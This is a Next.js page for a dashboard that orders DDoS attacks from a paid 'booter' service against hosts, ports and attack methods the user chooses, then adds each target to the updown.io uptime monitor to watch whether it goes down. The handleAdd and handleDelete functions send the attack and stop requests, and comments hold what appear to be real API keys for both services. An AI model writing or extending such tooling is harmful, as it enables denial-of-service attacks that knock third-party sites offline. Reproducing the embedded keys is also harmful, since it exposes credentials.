import Head from 'next/head'
import Image from 'next/image'
import { Inter } from '@next/font/google'
import styles from '@/styles/Home.module.css'


import { useEffect, useState } from 'react';
import { getUpDownAccountInfo } from 'booterAndUpDownApi/upDown';
import Form from 'components/Form';
import Item from 'components/Item';

const inter = Inter({ subsets: ['latin'] })

export default function Home() {

    const [loader, setLoader] = useState(false);

    const [booterApikey, setBooterApikey] = useState(''); //'13f1cffe6a828d73bd7f7bf6-28097a6a'
    const [upDownApikey, setUpDownApikey] = useState(''); //'SV67GruC8uVxPJPYtBhy'
    const [upDownAccountName, setUpDownAccountName] = useState(null);


    // all items list 
    //--------------------------------------
    const [items, setItems] = useState([
        // {
        //   id: 1,
        //   url: 'https://www.google.com',
        //   port: 80,
        //   status: 'not-running', // running, not-running, error
        //   isStarred: false,
        //   expiresIn: 60,
        //   method: 'HTTPSV2',
        //   interval: 30,
        // }
    ]);


    // add
    //--------------------------------------
    const handleAdd = async (formData) => {
        console.log(formData);
        setLoader(true); //show loader
        try {
            // send attack request
            const booterInfo = await fetch('api/sendBooterRequest', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: booterApikey,
                    host: formData.url,
                    port: formData.port,
                    method: formData.method,
                    time: formData.expiresIn,
                }),
            });
            const booterInfoJson = await booterInfo.json();
            console.log(booterInfoJson);


            // add to updown
            const data = await fetch('api/addUrlToUpDown', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: upDownApikey,
                    url: formData.url,
                    period: formData.interval,
                }),
            });
            const json = await data.json();
            formData.updownToken = json.token;
            console.log(json)
            console.log(formData)
            const newItems = [...items, formData];
            setItems(newItems);
            setItemsToItemsJsonFile(newItems);

            setLoader(false); // hide loader
        } catch (error) {
            console.log(error);
            setLoader(false);
        }
    }

    // update 
    //--------------------------------------
    const handleUpdate = (id, formData) => {
        const newItems = items.map(item => item.id === id ? formData : item);
        setItems(newItems);
        setItemsToItemsJsonFile(newItems);
    }


    // delete 
    //--------------------------------------
    const handleDelete = async(id) => {
        try {
            // delete from booter
            const booterInfo = await fetch('api/sendBooterRequest', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: booterApikey,
                    host: items.find(item => item.id === id).url,
                    port: items.find(item => item.id === id).port, 
                    time: items.find(item => item.id === id).expiresIn,
                    method: 'stop',
                }),
            });
            const booterInfoJson = await booterInfo.json();
            console.log(booterInfoJson);

            // delete from updown
            const data = await fetch('api/deleteUrlFromUpDown', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    apikey: upDownApikey,
                    token: items.find(item => item.id === id).updownToken,
                }),
            });
            const json = await data.json();

            const newItems = items.filter(item => item.id !== id)
            setItems(newItems);
            setItemsToItemsJsonFile(newItems);
            console.log(items);
        } catch (error) {
            console.log(error);
        }
    }


    // on api key added or changed
    // if api key is not null
    useEffect(() => {
        if (upDownApikey) {
            getUpDownAccountInfo(upDownApikey).then(data => {
                setUpDownAccountName(data[0].name);
            });

            // save api key on local storage
            localStorage.setItem('upDownApikey', upDownApikey);

        }
    }, [upDownApikey]);

    // if api key is not null
    // get account info
    useEffect(() => {
        if (booterApikey) {
            console.log(booterApikey);
            // save api key on local storage
            localStorage.setItem('booterApikey', booterApikey);
        }
    }, [booterApikey]);


    // on init the page
    //----------------------------------------------------
    useEffect(()=>{
        // get api keys
        const booterApikey = localStorage.getItem('booterApikey');
        if(booterApikey) setBooterApikey(booterApikey);
        const upDownApikey = localStorage.getItem('upDownApikey');
        if(upDownApikey) setUpDownApikey(upDownApikey);


        // get all items from items.json
        fetch('api/itemsGetter', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            }
        }).then(res => res.json()).then(data => {
            setItems(data);
        });

    }, []);


    // set items to items.json
    function setItemsToItemsJsonFile(items){
        fetch('api/itemsSetter', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(items),
        }).then(res => res.json()).then(data => {})
    }
  
  

    return (
        <>
            <Head>
                <title>Create Next App</title>
                <meta name="description" content="Generated by create next app" />
                <meta name="viewport" content="width=device-width, initial-scale=1" />
                <link rel="icon" href="/favicon.ico" />
            </Head>
            <main>
                <label htmlFor="upDownApiKey">updown api key</label>
                <input id='upDownApiKey' type="text" placeholder='updown api key' value={upDownApikey} onChange={(e)=> setUpDownApikey(e.target.value)} />
                {
                    upDownAccountName === null?
                    <strong style={{color: 'red'}}> Account Not Connected </strong>
                    : <strong style={{color: 'green'}}>{upDownAccountName}</strong>
                }
                
                <br />
                <label htmlFor="booterApiKey">booter api key</label>
                <input id='booterApiKey' type="text" placeholder='booter api key' value={booterApikey} onChange={(e)=> setBooterApikey(e.target.value)} />

                <h1>add item</h1>
                <Form 
                    onSubmit={handleAdd}
                    upDownApikey={upDownApikey} 
                    booterApikey={booterApikey}
                    loader={loader}  />

                <h1>all items</h1>
                <ul>
                    {items && items.map(item => (
                        <Item 
                            key={item.id} 
                            upDownApikey={upDownApikey} 
                            booterApikey={booterApikey}
                            itemData={item} 
                            handleDelete={handleDelete} 
                            handleUpdate={handleUpdate} />
                    ))}
                </ul>
            </main>
        </>
    )
}
